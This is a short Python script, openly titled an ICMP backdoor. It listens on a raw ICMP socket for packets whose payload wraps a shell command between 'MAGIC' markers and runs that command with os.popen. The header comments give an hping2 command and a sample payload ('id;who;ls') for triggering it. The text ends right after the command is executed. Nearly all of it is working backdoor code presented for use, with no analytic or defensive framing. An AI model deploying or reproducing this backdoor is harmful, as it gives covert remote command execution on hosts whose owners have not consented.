#!/usr/bin/env python
# ICMP backdoor
# Use with.
# hping2 --icmp 127.0.0.1 -d 512 -E file -c 1
# art:/home/p0ison# cat file
# MAGICid;who;lsMAGIC
#
import socket
import os
import struct

if __name__ == "__main__":
	icmp = socket.getprotobyname("icmp")
	s = socket.socket(socket.AF_INET,socket.SOCK_RAW,icmp)
	while 1:
		(recvpacket,addr) = s.recvfrom(1024)
		if "MAGIC" in recvpacket:
			(header,cmd,junk) = recvpacket.split("MAGIC")
			icmpheader = header[20:28]
			if "\x08" in icmpheader[0]:
				data = os.popen(str(cmd)).readlines()
